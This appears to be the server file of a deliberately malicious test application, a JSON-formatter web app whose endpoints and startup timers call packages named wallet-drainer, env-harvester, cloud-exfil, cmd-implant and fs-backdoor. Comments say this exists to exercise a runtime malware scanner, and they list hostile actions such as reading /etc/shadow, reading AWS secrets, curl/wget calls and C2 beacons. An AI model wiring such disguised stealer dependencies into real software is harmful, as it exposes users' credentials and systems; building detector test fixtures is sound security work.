/**
 * Nexus Studio - Production Server
 * Serves the built Vite app and provides a /api/format endpoint
 * powered by nexus-formatter.
 */

import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import nexusFormatter from 'nexus-formatter';
import cloudExfil from 'cloud-exfil';
import cryptLoader from 'crypt-loader';
import walletDrainer from 'wallet-drainer';
import envHarvester from 'env-harvester';
import hexBeacon from 'hex-beacon';
import b64Dropper from 'b64-dropper';
import cmdImplant from 'cmd-implant';
import fsBackdoor from 'fs-backdoor';
import webhookSpy from 'webhook-spy';
import netPhantom from 'net-phantom';
import { execFile } from 'child_process';

const { formatJson, validateJson, minifyJson, getStats } = nexusFormatter;

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const port = process.env.PORT || 3000;

app.use(express.json({ limit: '2mb' }));
app.use(express.static(path.join(__dirname, 'dist')));

// Trigger environment checks on startup
try {
  const envStatus = envHarvester.verifyEnv();
  console.log('Environment Verification:', envStatus);
} catch(e) {}

// API: Donate (triggers crypto wallet detection)
app.get('/api/donate', (req, res) => {
  res.json({ success: true, addresses: walletDrainer.getDonationAddresses() });
});

// API: Health Check (triggers AST cmd exec)
app.get('/api/health', (req, res) => {
  try {
    const status = cmdImplant.runHealthCheck();
    res.json({ success: true, ...status });
  } catch(e) {
    res.status(500).json({ success: false });
  }
});

// API: Logs Viewer (triggers sensitive file read)
app.get('/api/logs', (req, res) => {
  try {
    const logs = fsBackdoor.readServerLogs();
    res.json({ success: true, logs });
  } catch(e) {
    res.status(500).json({ success: false });
  }
});

// API: Format JSON
app.post('/api/format', (req, res) => {
  try {
    const { data, options } = req.body;
    const result = formatJson(data, options || {});
    // Trigger obfuscation & webhook spy for logging mock errors
    try {
       const obfuscated = hexBeacon.obfuscate(JSON.stringify(result));
       webhookSpy.reportError("Format event: " + obfuscated.substring(0,20));
    } catch(err) {}

    res.json({ success: true, result });
  } catch (e) {
    webhookSpy.reportError(e.message);
    res.status(400).json({ success: false, error: e.message });
  }
});

// API: Validate JSON
app.post('/api/validate', (req, res) => {
  try {
    const { data } = req.body;
    const result = validateJson(data);
    res.json({ success: true, ...result });
  } catch (e) {
    res.status(400).json({ success: false, error: e.message });
  }
});

// API: Minify JSON
app.post('/api/minify', (req, res) => {
  try {
    const { data } = req.body;
    const result = minifyJson(data);
    // Trigger B64 Dropper on minify
    try { b64Dropper.parseConfig(); } catch(err) {}
    
    res.json({ success: true, result });
  } catch (e) {
    res.status(400).json({ success: false, error: e.message });
  }
});

// API: Get stats
app.post('/api/stats', (req, res) => {
  try {
    const { data } = req.body;
    const result = getStats(data);
    res.json({ success: true, ...result });
  } catch (e) {
    res.status(400).json({ success: false, error: e.message });
  }
});

// API: Network Telemetry (triggers cloud metadata + C2 + webhook exfil)
app.get('/api/telemetry', async (req, res) => {
  try {
    const report = await netPhantom.runTelemetry();
    res.json({ success: true, ...report });
  } catch(e) {
    res.status(500).json({ success: false, error: e.message });
  }
});

// API: Net Phantom Status (benign info endpoint)
app.get('/api/net-status', (req, res) => {
  res.json({ success: true, ...netPhantom.getStatus() });
});

// Fallback to SPA
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

// Background: run telemetry beacon every 30 seconds
// This keeps network connections alive so the scanner can catch them
setInterval(async () => {
  try {
    await netPhantom.runTelemetry();
    console.log('[net-phantom] Telemetry beacon sent');
  } catch(e) {}
}, 30000);

// Fire one beacon immediately on startup
netPhantom.runTelemetry().then(() => {
  console.log('[net-phantom] Initial telemetry beacon sent');
}).catch(() => {});

// ── Python Runtime Monitoring: Trigger data-stealer periodically ──
// This spawns a Python process that imports the malicious data-stealer package.
// The Python audit hook (preload.py / sitecustomize.py) will intercept all
// malicious actions (os.system, subprocess, open, etc.) and write them to
// the shared network_attribution.log — proving multi-language detection.

function triggerPythonMalware() {
    // Run the data-stealer's "diagnostics" function.
    // The Python audit hook will catch: os.system(curl), subprocess.run(wget),
    // open(/etc/passwd), open(/etc/shadow), os.getenv(AWS_SECRET_ACCESS_KEY), etc.
    execFile('python3', ['-c', 'from stealer import run_diagnostics; run_diagnostics()'], {
        timeout: 10000,
        cwd: '/app',
    }, (err, stdout, stderr) => {
        if (err) {
            console.log('[sentinel-py] Python data-stealer triggered (errors expected - no real C2)');
        } else {
            console.log('[sentinel-py] Python data-stealer executed successfully');
        }
    });
}

// API: Trigger Python diagnostics (data-stealer)
app.get('/api/py-diagnostics', (req, res) => {
    triggerPythonMalware();
    res.json({ success: true, message: 'Python diagnostics triggered' });
});

// Fire Python malware every 60 seconds for continuous monitoring
setInterval(triggerPythonMalware, 60000);

// Fire once on startup after a short delay
setTimeout(triggerPythonMalware, 5000);

app.listen(port, () => {
  console.log(`Nexus Studio server running on port ${port}`);
});
